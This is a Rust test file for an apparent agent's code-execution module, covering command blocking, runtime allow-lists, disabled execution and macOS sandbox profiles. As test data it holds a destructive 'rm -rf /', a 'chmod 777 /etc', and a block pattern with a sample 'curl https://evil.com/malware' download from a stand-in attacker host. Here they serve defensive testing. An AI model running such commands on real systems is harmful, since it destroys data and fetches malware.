//! Tests for code execution

use super::*;
use std::path::PathBuf;

#[test]
fn test_command_checker_default_blocked() {
    let checker = CommandChecker::default();

    // Should block dangerous commands
    assert!(checker.is_blocked("rm -rf /").is_some());
    assert!(checker.is_blocked("sudo apt install").is_some());
    assert!(checker.is_blocked("chmod 777 /etc").is_some());

    // Should allow safe commands
    assert!(checker.is_blocked("ls -la").is_none());
    assert!(checker.is_blocked("echo hello").is_none());
    assert!(checker.is_blocked("python3 script.py").is_none());
}

#[test]
fn test_command_checker_custom_blocked() {
    let checker = CommandChecker::new(vec!["curl.*evil\\.com".to_string()]);

    assert!(checker
        .is_blocked("curl https://evil.com/malware")
        .is_some());
    assert!(checker.is_blocked("curl https://example.com").is_none());
}

#[tokio::test]
async fn test_runtime_detection() {
    // bash should be available on most systems
    let bash = RuntimeInfo::detect("bash").await;
    // This test may fail on Windows, but that's expected
    #[cfg(unix)]
    assert!(bash.available);
}

#[test]
fn test_code_exec_result_serialization() {
    let result = CodeExecResult {
        exit_code: 0,
        stdout: "hello world".to_string(),
        stderr: String::new(),
        duration_ms: 100,
        stdout_truncated: false,
        stderr_truncated: false,
        runtime: "bash".to_string(),
    };

    let json = serde_json::to_string(&result).unwrap();
    assert!(json.contains("hello world"));
    assert!(json.contains("exit_code"));
}

#[test]
fn test_is_runtime_allowed() {
    let permission_checker = PathPermissionChecker::default();

    // All runtimes allowed when list is empty
    let executor = CodeExecutor::new(
        true,
        "bash".to_string(),
        60,
        true,
        vec![],
        false,
        vec![],
        permission_checker.clone(),
        None,
        vec!["PATH".to_string()],
        None, // No aleph_path in tests
    );
    assert!(executor.is_runtime_allowed("python3"));
    assert!(executor.is_runtime_allowed("node"));

    // Only specific runtimes allowed
    let executor2 = CodeExecutor::new(
        true,
        "bash".to_string(),
        60,
        true,
        vec!["bash".to_string(), "python3".to_string()],
        false,
        vec![],
        permission_checker,
        None,
        vec!["PATH".to_string()],
        None, // No aleph_path in tests
    );
    assert!(executor2.is_runtime_allowed("bash"));
    assert!(executor2.is_runtime_allowed("python3"));
    assert!(!executor2.is_runtime_allowed("node"));
}

#[tokio::test]
async fn test_disabled_execution() {
    let permission_checker = PathPermissionChecker::default();
    let executor = CodeExecutor::new(
        false, // disabled
        "bash".to_string(),
        60,
        false,
        vec![],
        false,
        vec![],
        permission_checker,
        None,
        vec!["PATH".to_string()],
        None, // No aleph_path in tests
    );

    let task = Task::new(
        "test_task",
        "Test Task",
        TaskType::CodeExecution(CodeExec::Command {
            cmd: "echo".to_string(),
            args: vec!["hello".to_string()],
        }),
    );

    let ctx = ExecutionContext::new("test_graph");

    let result = executor.execute(&task, &ctx).await;
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("disabled"));
}

// ===== Sandbox Tests =====

#[test]
fn test_sandbox_config_default() {
    let config = SandboxConfig::default();
    // Default: sandbox enabled, allow_exec true (for running code)
    assert!(config.enabled);
    assert!(!config.allow_network);
    assert!(config.allow_exec);
    assert!(config.read_paths.is_empty());
    assert!(config.write_paths.is_empty());
}

#[test]
#[cfg(target_os = "macos")]
fn test_sandbox_profile_generation_basic() {
    let config = SandboxConfig {
        enabled: true,
        read_paths: vec![],
        write_paths: vec![],
        allow_network: false,
        allow_exec: false,
    };

    let profile = config.generate_profile();

    // Should contain version declaration
    assert!(profile.contains("(version 1)"));

    // Should have deny default which blocks everything not explicitly allowed
    assert!(profile.contains("(deny default)"));

    // Should NOT allow network when disabled
    assert!(!profile.contains("(allow network*)"));

    // Should NOT allow process-exec when disabled
    assert!(!profile.contains("(allow process-exec)"));
}

#[test]
#[cfg(target_os = "macos")]
fn test_sandbox_profile_with_network() {
    let config = SandboxConfig {
        enabled: true,
        read_paths: vec![],
        write_paths: vec![],
        allow_network: true,
        allow_exec: false,
    };

    let profile = config.generate_profile();

    // Should allow network when enabled
    assert!(profile.contains("(allow network*)"));
}

#[test]
#[cfg(target_os = "macos")]
fn test_sandbox_profile_with_exec() {
    let config = SandboxConfig {
        enabled: true,
        read_paths: vec![],
        write_paths: vec![],
        allow_network: false,
        allow_exec: true,
    };

    let profile = config.generate_profile();

    // Should allow process-exec when enabled
    assert!(profile.contains("(allow process-exec)"));
}

#[test]
#[cfg(target_os = "macos")]
fn test_sandbox_profile_with_paths() {
    let config = SandboxConfig {
        enabled: true,
        read_paths: vec![PathBuf::from("/tmp/test_read")],
        write_paths: vec![PathBuf::from("/tmp/test_write")],
        allow_network: false,
        allow_exec: false,
    };

    let profile = config.generate_profile();

    // Should include read path
    assert!(profile.contains("/tmp/test_read"));

    // Should include write path
    assert!(profile.contains("/tmp/test_write"));
}

#[test]
fn test_sandbox_config_with_executor() {
    let permission_checker = PathPermissionChecker::default();

    // Create executor with sandbox enabled
    let executor = CodeExecutor::new(
        true,
        "bash".to_string(),
        60,
        true, // sandbox_enabled
        vec![],
        false, // allow_network
        vec![],
        permission_checker,
        None,
        vec!["PATH".to_string()],
        None, // No aleph_path in tests
    );

    // Verify sandbox config is set correctly
    assert!(executor._sandbox_config.enabled);
    assert!(!executor._sandbox_config.allow_network);
}
